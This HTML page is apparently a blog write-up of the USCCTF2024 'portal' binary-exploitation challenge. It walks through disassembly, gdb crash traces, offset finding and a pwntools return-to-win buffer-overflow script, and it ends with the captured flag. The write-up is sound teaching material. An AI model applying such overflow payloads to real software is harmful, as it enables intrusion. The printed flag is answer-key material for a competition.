<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>USCCTF2024 Pwn Portal | All Things Cyber – joonkim0625</title>
<meta name="keywords" content="pwn, gdb, cybersecurity, ctf, uscctf 2024">
<meta name="description" content="Description
Can you use the portals to get to the right place?

You are provided with a 32-bit executable:
└─$ file portal 
portal: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=2777afda2049624cbbecde55650e58f347efcd29, for GNU/Linux 3.2.0, not stripped
Using checksec on this binary reveals that there are no security defenses enabled:
[*] &#39;/home/kali/ctf/uscctf2024/pwn/portal/portal&#39;
    Arch:       i386-32-little
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x8048000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
This is a straightforward &ldquo;return-to-win&rdquo; challenge. Upon inspecting the binary with objdump, you can see that the function win is the goal:">
<meta name="author" content="Joon Kim">
<link rel="canonical" href="https://joonkim0625.github.io/posts/2024-11-15-uscctf2024-pwn-portal/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.8fe10233a706bc87f2e08b3cf97b8bd4c0a80f10675a143675d59212121037c0.css" integrity="sha256-j&#43;ECM6cGvIfy4Is8&#43;XuL1MCoDxBnWhQ2ddWSEhIQN8A=" rel="preload stylesheet" as="style">
<link rel="icon" href="https://joonkim0625.github.io/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://joonkim0625.github.io/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://joonkim0625.github.io/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://joonkim0625.github.io/apple-touch-icon.png">
<link rel="mask-icon" href="https://joonkim0625.github.io/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="https://joonkim0625.github.io/posts/2024-11-15-uscctf2024-pwn-portal/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:url" content="https://joonkim0625.github.io/posts/2024-11-15-uscctf2024-pwn-portal/">
  <meta property="og:site_name" content="All Things Cyber – joonkim0625">
  <meta property="og:title" content="USCCTF2024 Pwn Portal">
  <meta property="og:description" content="Description Can you use the portals to get to the right place? You are provided with a 32-bit executable:
└─$ file portal portal: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=2777afda2049624cbbecde55650e58f347efcd29, for GNU/Linux 3.2.0, not stripped Using checksec on this binary reveals that there are no security defenses enabled:
[*] &#39;/home/kali/ctf/uscctf2024/pwn/portal/portal&#39; Arch: i386-32-little RELRO: No RELRO Stack: No canary found NX: NX unknown - GNU_STACK missing PIE: No PIE (0x8048000) Stack: Executable RWX: Has RWX segments Stripped: No This is a straightforward “return-to-win” challenge. Upon inspecting the binary with objdump, you can see that the function win is the goal:">
  <meta property="og:locale" content="en-us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2024-11-15T00:24:34+00:00">
    <meta property="article:modified_time" content="2024-11-15T00:24:34+00:00">
    <meta property="article:tag" content="Pwn">
    <meta property="article:tag" content="Gdb">
    <meta property="article:tag" content="Cybersecurity">
    <meta property="article:tag" content="CTF">
    <meta property="article:tag" content="Uscctf 2024">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="USCCTF2024 Pwn Portal">
<meta name="twitter:description" content="Description
Can you use the portals to get to the right place?

You are provided with a 32-bit executable:
└─$ file portal 
portal: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=2777afda2049624cbbecde55650e58f347efcd29, for GNU/Linux 3.2.0, not stripped
Using checksec on this binary reveals that there are no security defenses enabled:
[*] &#39;/home/kali/ctf/uscctf2024/pwn/portal/portal&#39;
    Arch:       i386-32-little
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x8048000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
This is a straightforward &ldquo;return-to-win&rdquo; challenge. Upon inspecting the binary with objdump, you can see that the function win is the goal:">


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "https://joonkim0625.github.io/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "USCCTF2024 Pwn Portal",
      "item": "https://joonkim0625.github.io/posts/2024-11-15-uscctf2024-pwn-portal/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "USCCTF2024 Pwn Portal",
  "name": "USCCTF2024 Pwn Portal",
  "description": "Description Can you use the portals to get to the right place? You are provided with a 32-bit executable:\n└─$ file portal portal: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=2777afda2049624cbbecde55650e58f347efcd29, for GNU/Linux 3.2.0, not stripped Using checksec on this binary reveals that there are no security defenses enabled:\n[*] \u0026#39;/home/kali/ctf/uscctf2024/pwn/portal/portal\u0026#39; Arch: i386-32-little RELRO: No RELRO Stack: No canary found NX: NX unknown - GNU_STACK missing PIE: No PIE (0x8048000) Stack: Executable RWX: Has RWX segments Stripped: No This is a straightforward \u0026ldquo;return-to-win\u0026rdquo; challenge. Upon inspecting the binary with objdump, you can see that the function win is the goal:\n",
  "keywords": [
    "pwn", "gdb", "cybersecurity", "ctf", "uscctf 2024"
  ],
  "articleBody": "Description Can you use the portals to get to the right place? You are provided with a 32-bit executable:\n└─$ file portal portal: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=2777afda2049624cbbecde55650e58f347efcd29, for GNU/Linux 3.2.0, not stripped Using checksec on this binary reveals that there are no security defenses enabled:\n[*] '/home/kali/ctf/uscctf2024/pwn/portal/portal' Arch: i386-32-little RELRO: No RELRO Stack: No canary found NX: NX unknown - GNU_STACK missing PIE: No PIE (0x8048000) Stack: Executable RWX: Has RWX segments Stripped: No This is a straightforward “return-to-win” challenge. Upon inspecting the binary with objdump, you can see that the function win is the goal:\n... 080491f6 : 80491f6: 55 push %ebp 80491f7: 89 e5 mov %esp,%ebp 80491f9: e8 38 01 00 00 call 8049336 \u003c__x86.get_pc_thunk.ax\u003e 80491fe: 05 16 21 00 00 add $0x2116,%eax 8049203: 8b 45 04 mov 0x4(%ebp),%eax 8049206: 5d pop %ebp 8049207: c3 ret 08049208 : 8049208: 55 push %ebp 8049209: 89 e5 mov %esp,%ebp 804920b: 53 push %ebx 804920c: 83 ec 44 sub $0x44,%esp 804920f: e8 1c ff ff ff call 8049130 \u003c__x86.get_pc_thunk.bx\u003e 8049214: 81 c3 00 21 00 00 add $0x2100,%ebx 804921a: 83 ec 08 sub $0x8,%esp 804921d: 8d 83 f4 ec ff ff lea -0x130c(%ebx),%eax 8049223: 50 push %eax 8049224: 8d 83 f6 ec ff ff lea -0x130a(%ebx),%eax 804922a: 50 push %eax 804922b: e8 90 fe ff ff call 80490c0 8049230: 83 c4 10 add $0x10,%esp 8049233: 89 45 f4 mov %eax,-0xc(%ebp) 8049236: 83 7d f4 00 cmpl $0x0,-0xc(%ebp) 804923a: 75 1c jne 8049258 804923c: 83 ec 0c sub $0xc,%esp 804923f: 8d 83 00 ed ff ff lea -0x1300(%ebx),%eax 8049245: 50 push %eax 8049246: e8 45 fe ff ff call 8049090 804924b: 83 c4 10 add $0x10,%esp 804924e: 83 ec 0c sub $0xc,%esp 8049251: 6a 00 push $0x0 8049253: e8 48 fe ff ff call 80490a0 8049258: 83 ec 04 sub $0x4,%esp 804925b: ff 75 f4 push -0xc(%ebp) 804925e: 6a 2d push $0x2d 8049260: 8d 45 c7 lea -0x39(%ebp),%eax 8049263: 50 push %eax 8049264: e8 07 fe ff ff call 8049070 8049269: 83 c4 10 add $0x10,%esp 804926c: 83 ec 0c sub $0xc,%esp 804926f: 8d 45 c7 lea -0x39(%ebp),%eax 8049272: 50 push %eax 8049273: e8 d8 fd ff ff call 8049050 8049278: 83 c4 10 add $0x10,%esp 804927b: 90 nop 804927c: 8b 5d fc mov -0x4(%ebp),%ebx 804927f: c9 leave 8049280: c3 ret 08049281 : 8049281: 55 push %ebp 8049282: 89 e5 mov %esp,%ebp 8049284: 53 push %ebx 8049285: 83 ec 24 sub $0x24,%esp 8049288: e8 a3 fe ff ff call 8049130 \u003c__x86.get_pc_thunk.bx\u003e 804928d: 81 c3 87 20 00 00 add $0x2087,%ebx 8049293: 83 ec 0c sub $0xc,%esp 8049296: 8d 45 d8 lea -0x28(%ebp),%eax 8049299: 50 push %eax 804929a: e8 c1 fd ff ff call 8049060 804929f: 83 c4 10 add $0x10,%esp 80492a2: e8 4f ff ff ff call 80491f6 80492a7: 83 ec 08 sub $0x8,%esp 80492aa: 50 push %eax 80492ab: 8d 83 4c ed ff ff lea -0x12b4(%ebx),%eax 80492b1: 50 push %eax 80492b2: e8 99 fd ff ff call 8049050 80492b7: 83 c4 10 add $0x10,%esp 80492ba: 90 nop 80492bb: 8b 5d fc mov -0x4(%ebp),%ebx 80492be: c9 leave 80492bf: c3 ret 080492c0 : 80492c0: 8d 4c 24 04 lea 0x4(%esp),%ecx 80492c4: 83 e4 f0 and $0xfffffff0,%esp 80492c7: ff 71 fc push -0x4(%ecx) 80492ca: 55 push %ebp 80492cb: 89 e5 mov %esp,%ebp 80492cd: 53 push %ebx 80492ce: 51 push %ecx 80492cf: 83 ec 10 sub $0x10,%esp 80492d2: e8 59 fe ff ff call 8049130 \u003c__x86.get_pc_thunk.bx\u003e 80492d7: 81 c3 3d 20 00 00 add $0x203d,%ebx 80492dd: 8b 83 fc ff ff ff mov -0x4(%ebx),%eax 80492e3: 8b 00 mov (%eax),%eax 80492e5: 6a 00 push $0x0 80492e7: 6a 02 push $0x2 80492e9: 6a 00 push $0x0 80492eb: 50 push %eax 80492ec: e8 bf fd ff ff call 80490b0 80492f1: 83 c4 10 add $0x10,%esp 80492f4: e8 87 fd ff ff call 8049080 80492f9: 89 45 f4 mov %eax,-0xc(%ebp) 80492fc: 83 ec 04 sub $0x4,%esp 80492ff: ff 75 f4 push -0xc(%ebp) 8049302: ff 75 f4 push -0xc(%ebp) 8049305: ff 75 f4 push -0xc(%ebp) 8049308: e8 c3 fd ff ff call 80490d0 804930d: 83 c4 10 add $0x10,%esp 8049310: 83 ec 0c sub $0xc,%esp 8049313: 8d 83 88 ed ff ff lea -0x1278(%ebx),%eax 8049319: 50 push %eax 804931a: e8 71 fd ff ff call 8049090 804931f: 83 c4 10 add $0x10,%esp 8049322: e8 5a ff ff ff call 8049281 8049327: b8 00 00 00 00 mov $0x0,%eax 804932c: 8d 65 f8 lea -0x8(%ebp),%esp 804932f: 59 pop %ecx 8049330: 5b pop %ebx 8049331: 5d pop %ebp 8049332: 8d 61 fc lea -0x4(%ecx),%esp 8049335: c3 ret ... The win function executes some operations, such as printing a flag. To exploit this, the program flow must be redirected to the win function.\nAnalyzing the Program Running the binary prompts for input:\nPlease enter your string: ABC Okay, time to return... Fingers Crossed... Jumping to 0x80492a7 The program takes your input and overwrites the return address on the stack. By analyzing its behavior in gdb, you can determine how to craft the payload. Sending a long input, such as 100 As, crashes the program:\n*EBP 0x41414141 ('AAAA') *ESP 0xffffcedc ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' *EIP 0x80492bf (vuln+62) ◂— ret ───────────────────────────────────[ DISASM / i386 / set emulate on ]─────────────────────────────────── 0x80492b2 call printf@plt 0x80492b7 add esp, 0x10 ESP =\u003e 0xffffceb0 (0xffffcea0 + 0x10) 0x80492ba nop 0x80492bb mov ebx, dword ptr [ebp - 4] EBX, [0xffffced4] =\u003e 0x41414141 ('AAAA') 0x80492be leave ► 0x80492bf ret \u003c0x41414141\u003e ↓ ───────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────── 00:0000│ esp 0xffffcedc ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' ... ↓ 7 skipped ─────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────── ► 0 0x80492bf vuln+62 1 0x41414141 None 2 0x41414141 None 3 0x41414141 None 4 0x41414141 None 5 0x41414141 None 6 0x41414141 None 7 0x41414141 None ──────────────────────────────────────────────────────────────────────────────────────────────────────── pwndbg\u003e ni 0x41414141 in ?? () LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA ─────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────── EAX 0x40 EBX 0x41414141 ('AAAA') ECX 0 EDX 0 EDI 0xf7ffcb60 (_rtld_global_ro) ◂— 0 ESI 0xffffcfcc —▸ 0xffffd1d8 ◂— 'COLORFGBG=15;0' EBP 0x41414141 ('AAAA') *ESP 0xffffcee0 ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' *EIP 0x41414141 ('AAAA') ───────────────────────────────────[ DISASM / i386 / set emulate on ]─────────────────────────────────── Invalid address 0x41414141 At this point, you control the EIP register. When a function returns, the ret instruction pops the top value of the stack into EIP, redirecting execution to that address.\nFinding the Offset To determine the exact offset where the buffer overflow occurs, use a cyclic pattern:\n───────────────────────────────────[ DISASM / i386 / set emulate on ]─────────────────────────────────── ► 0x80491f9 call __x86.get_pc_thunk.ax \u003c__x86.get_pc_thunk.ax\u003e arg[0]: 0xffffced8 ◂— 'kaaalaaama' arg[1]: 0x80492a7 (vuln+38) ◂— sub esp, 8 arg[2]: 0x61616161 ('aaaa') arg[3]: 0x61616162 ('baaa') 0x80491fe add eax, 0x2116 0x8049203 mov eax, dword ptr [ebp + 4] 0x8049206 pop ebp 0x8049207 ret 0x8049208 push ebp 0x8049209 mov ebp, esp 0x804920b push ebx 0x804920c sub esp, 0x44 0x804920f call __x86.get_pc_thunk.bx \u003c__x86.get_pc_thunk.bx\u003e 0x8049214 add ebx, 0x2100 ───────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────── 00:0000│ ebp esp 0xffffcea8 —▸ 0xffffced8 ◂— 'kaaalaaama' 01:0004│+004 0xffffceac —▸ 0x80492a7 (vuln+38) ◂— sub esp, 8 02:0008│ eax 0xffffceb0 ◂— 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama' 03:000c│+00c 0xffffceb4 ◂— 'baaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama' 04:0010│+010 0xffffceb8 ◂— 'caaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama' 05:0014│+014 0xffffcebc ◂— 'daaaeaaafaaagaaahaaaiaaajaaakaaalaaama' 06:0018│+018 0xffffcec0 ◂— 'eaaafaaagaaahaaaiaaajaaakaaalaaama' 07:001c│+01c 0xffffcec4 ◂— 'faaagaaahaaaiaaajaaakaaalaaama' ─────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────── ► 0 0x80491f9 get_return_address+3 1 0x80492a7 vuln+38 2 0x6161616c None 3 0xff00616d None 4 0xf7d87964 None ──────────────────────────────────────────────────────────────────────────────────────────────────────── pwndbg\u003e c Continuing. Okay, time to return... Fingers Crossed... Jumping to 0x80492a7 Program received signal SIGSEGV, Segmentation fault. 0x6161616c in ?? () LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA ─────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────── *EAX 0x40 *EBX 0x6161616a ('jaaa') *ECX 0 EDX 0 EDI 0xf7ffcb60 (_rtld_global_ro) ◂— 0 ESI 0xffffcfcc —▸ 0xffffd1d8 ◂— 'COLORFGBG=15;0' *EBP 0x6161616b ('kaaa') *ESP 0xffffcee0 ◂— 0xff00616d /* 'ma' */ *EIP 0x6161616c ('laaa') ───────────────────────────────────[ DISASM / i386 / set emulate on ]─────────────────────────────────── Invalid address 0x6161616c As you can see, it tells you that -x6161616c was used to jump to that location which isn’t available obviously.\npwndbg\u003e cyclic -l 0x6161616c Finding cyclic pattern of 4 bytes: b'laaa' (hex: 0x6c616161) Found at offset 44 This tells us that the buffer can hold 44 junk bytes before overwriting EIP. The final payload consists of:\n44 bytes of junk The address of the win function (0x08049208). Crafting the Exploit Using pwntools, you can automate the exploit:\nfrom pwn import * context.update(arch='i386', os='linux') #p = process(\"./portal\") p = remote('0.cloud.chals.io', 11723) payload = b\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\" payload += p32(0x08049208) p.sendline(payload) p.interactive() Results Running the script produces:\n└─$ python solve.py [+] Opening connection to 0.cloud.chals.io on port 11723: Done [*] Switching to interactive mode Please enter your string: Okay, time to return... Fingers Crossed... Jumping to 0x80492a7 CYBORG{w0w_u_r_0n_y0ur_w4y_2_b_a_r34l_h4x0r![*] Got EOF while reading in interactive Conclusion Although 32-bit executables are less common today due to the widespread adoption of 64-bit systems, they are still found in legacy applications, embedded systems, and challenges like this. Understanding how to exploit 32-bit binaries remains a valuable skill for learning system internals and practicing reverse engineering.\n",
  "wordCount" : "1495",
  "inLanguage": "en",
  "datePublished": "2024-11-15T00:24:34Z",
  "dateModified": "2024-11-15T00:24:34Z",
  "author":{
    "@type": "Person",
    "name": "Joon Kim"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://joonkim0625.github.io/posts/2024-11-15-uscctf2024-pwn-portal/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "All Things Cyber – joonkim0625",
    "logo": {
      "@type": "ImageObject",
      "url": "https://joonkim0625.github.io/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://joonkim0625.github.io/" accesskey="h" title="All Things Cyber – joonkim0625 (Alt + H)">All Things Cyber – joonkim0625</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://joonkim0625.github.io/search/" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
            <li>
                <a href="https://joonkim0625.github.io/tags/" title="Tags">
                    <span>Tags</span>
                </a>
            </li>
            <li>
                <a href="https://joonkim0625.github.io/about/" title="About">
                    <span>About</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title entry-hint-parent">
      USCCTF2024 Pwn Portal
    </h1>
    <div class="post-meta"><span title='2024-11-15 00:24:34 +0000 UTC'>November 15, 2024</span>&nbsp;·&nbsp;Joon Kim

</div>
  </header> 
  <div class="post-content"><h2 id="description">Description<a hidden class="anchor" aria-hidden="true" href="#description">#</a></h2>
<pre><code>Can you use the portals to get to the right place?
</code></pre>
<p>You are provided with a 32-bit executable:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>└─$ file portal 
</span></span><span style="display:flex;"><span>portal: ELF 32-bit LSB executable, Intel 80386, version <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>SYSV<span style="color:#f92672">)</span>, dynamically linked, interpreter /lib/ld-linux.so.2, BuildID<span style="color:#f92672">[</span>sha1<span style="color:#f92672">]=</span>2777afda2049624cbbecde55650e58f347efcd29, <span style="color:#66d9ef">for</span> GNU/Linux 3.2.0, not stripped
</span></span></code></pre></div><p>Using checksec on this binary reveals that there are no security defenses enabled:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;/home/kali/ctf/uscctf2024/pwn/portal/portal&#39;</span>
</span></span><span style="display:flex;"><span>    Arch:       i386-32-little
</span></span><span style="display:flex;"><span>    RELRO:      No RELRO
</span></span><span style="display:flex;"><span>    Stack:      No canary found
</span></span><span style="display:flex;"><span>    NX:         NX unknown - GNU_STACK missing
</span></span><span style="display:flex;"><span>    PIE:        No PIE <span style="color:#f92672">(</span>0x8048000<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    Stack:      Executable
</span></span><span style="display:flex;"><span>    RWX:        Has RWX segments
</span></span><span style="display:flex;"><span>    Stripped:   No
</span></span></code></pre></div><p>This is a straightforward &ldquo;return-to-win&rdquo; challenge. Upon inspecting the binary with objdump, you can see that the function win is the goal:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>080491f6 &lt;get_return_address&gt;:
</span></span><span style="display:flex;"><span> 80491f6:       <span style="color:#ae81ff">55</span>                      push   %ebp
</span></span><span style="display:flex;"><span> 80491f7:       <span style="color:#ae81ff">89</span> e5                   mov    %esp,%ebp
</span></span><span style="display:flex;"><span> 80491f9:       e8 <span style="color:#ae81ff">38</span> <span style="color:#ae81ff">01</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>          call   <span style="color:#ae81ff">8049336</span> &lt;__x86.get_pc_thunk.ax&gt;
</span></span><span style="display:flex;"><span> 80491fe:       <span style="color:#ae81ff">05</span> <span style="color:#ae81ff">16</span> <span style="color:#ae81ff">21</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>          add    $0x2116,%eax
</span></span><span style="display:flex;"><span> 8049203:       8b <span style="color:#ae81ff">45</span> <span style="color:#ae81ff">04</span>                mov    0x4<span style="color:#f92672">(</span>%ebp<span style="color:#f92672">)</span>,%eax
</span></span><span style="display:flex;"><span> 8049206:       5d                      pop    %ebp
</span></span><span style="display:flex;"><span> 8049207:       c3                      ret
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">08049208</span> &lt;win&gt;:
</span></span><span style="display:flex;"><span> 8049208:       <span style="color:#ae81ff">55</span>                      push   %ebp
</span></span><span style="display:flex;"><span> 8049209:       <span style="color:#ae81ff">89</span> e5                   mov    %esp,%ebp
</span></span><span style="display:flex;"><span> 804920b:       <span style="color:#ae81ff">53</span>                      push   %ebx
</span></span><span style="display:flex;"><span> 804920c:       <span style="color:#ae81ff">83</span> ec <span style="color:#ae81ff">44</span>                sub    $0x44,%esp
</span></span><span style="display:flex;"><span> 804920f:       e8 1c ff ff ff          call   <span style="color:#ae81ff">8049130</span> &lt;__x86.get_pc_thunk.bx&gt;
</span></span><span style="display:flex;"><span> 8049214:       <span style="color:#ae81ff">81</span> c3 <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">21</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>       add    $0x2100,%ebx
</span></span><span style="display:flex;"><span> 804921a:       <span style="color:#ae81ff">83</span> ec <span style="color:#ae81ff">08</span>                sub    $0x8,%esp
</span></span><span style="display:flex;"><span> 804921d:       8d <span style="color:#ae81ff">83</span> f4 ec ff ff       lea    -0x130c<span style="color:#f92672">(</span>%ebx<span style="color:#f92672">)</span>,%eax
</span></span><span style="display:flex;"><span> 8049223:       <span style="color:#ae81ff">50</span>                      push   %eax
</span></span><span style="display:flex;"><span> 8049224:       8d <span style="color:#ae81ff">83</span> f6 ec ff ff       lea    -0x130a<span style="color:#f92672">(</span>%ebx<span style="color:#f92672">)</span>,%eax
</span></span><span style="display:flex;"><span> 804922a:       <span style="color:#ae81ff">50</span>                      push   %eax
</span></span><span style="display:flex;"><span> 804922b:       e8 <span style="color:#ae81ff">90</span> fe ff ff          call   80490c0 &lt;fopen@plt&gt;
</span></span><span style="display:flex;"><span> 8049230:       <span style="color:#ae81ff">83</span> c4 <span style="color:#ae81ff">10</span>                add    $0x10,%esp
</span></span><span style="display:flex;"><span> 8049233:       <span style="color:#ae81ff">89</span> <span style="color:#ae81ff">45</span> f4                mov    %eax,-0xc<span style="color:#f92672">(</span>%ebp<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span> 8049236:       <span style="color:#ae81ff">83</span> 7d f4 <span style="color:#ae81ff">00</span>             cmpl   $0x0,-0xc<span style="color:#f92672">(</span>%ebp<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span> 804923a:       <span style="color:#ae81ff">75</span> 1c                   jne    <span style="color:#ae81ff">8049258</span> &lt;win+0x50&gt;
</span></span><span style="display:flex;"><span> 804923c:       <span style="color:#ae81ff">83</span> ec 0c                sub    $0xc,%esp
</span></span><span style="display:flex;"><span> 804923f:       8d <span style="color:#ae81ff">83</span> <span style="color:#ae81ff">00</span> ed ff ff       lea    -0x1300<span style="color:#f92672">(</span>%ebx<span style="color:#f92672">)</span>,%eax
</span></span><span style="display:flex;"><span> 8049245:       <span style="color:#ae81ff">50</span>                      push   %eax
</span></span><span style="display:flex;"><span> 8049246:       e8 <span style="color:#ae81ff">45</span> fe ff ff          call   <span style="color:#ae81ff">8049090</span> &lt;puts@plt&gt;
</span></span><span style="display:flex;"><span> 804924b:       <span style="color:#ae81ff">83</span> c4 <span style="color:#ae81ff">10</span>                add    $0x10,%esp
</span></span><span style="display:flex;"><span> 804924e:       <span style="color:#ae81ff">83</span> ec 0c                sub    $0xc,%esp
</span></span><span style="display:flex;"><span> 8049251:       6a <span style="color:#ae81ff">00</span>                   push   $0x0
</span></span><span style="display:flex;"><span> 8049253:       e8 <span style="color:#ae81ff">48</span> fe ff ff          call   80490a0 &lt;exit@plt&gt;
</span></span><span style="display:flex;"><span> 8049258:       <span style="color:#ae81ff">83</span> ec <span style="color:#ae81ff">04</span>                sub    $0x4,%esp
</span></span><span style="display:flex;"><span> 804925b:       ff <span style="color:#ae81ff">75</span> f4                push   -0xc<span style="color:#f92672">(</span>%ebp<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span> 804925e:       6a 2d                   push   $0x2d
</span></span><span style="display:flex;"><span> 8049260:       8d <span style="color:#ae81ff">45</span> c7                lea    -0x39<span style="color:#f92672">(</span>%ebp<span style="color:#f92672">)</span>,%eax
</span></span><span style="display:flex;"><span> 8049263:       <span style="color:#ae81ff">50</span>                      push   %eax
</span></span><span style="display:flex;"><span> 8049264:       e8 <span style="color:#ae81ff">07</span> fe ff ff          call   <span style="color:#ae81ff">8049070</span> &lt;fgets@plt&gt;
</span></span><span style="display:flex;"><span> 8049269:       <span style="color:#ae81ff">83</span> c4 <span style="color:#ae81ff">10</span>                add    $0x10,%esp
</span></span><span style="display:flex;"><span> 804926c:       <span style="color:#ae81ff">83</span> ec 0c                sub    $0xc,%esp
</span></span><span style="display:flex;"><span> 804926f:       8d <span style="color:#ae81ff">45</span> c7                lea    -0x39<span style="color:#f92672">(</span>%ebp<span style="color:#f92672">)</span>,%eax
</span></span><span style="display:flex;"><span> 8049272:       <span style="color:#ae81ff">50</span>                      push   %eax
</span></span><span style="display:flex;"><span> 8049273:       e8 d8 fd ff ff          call   <span style="color:#ae81ff">8049050</span> &lt;printf@plt&gt;
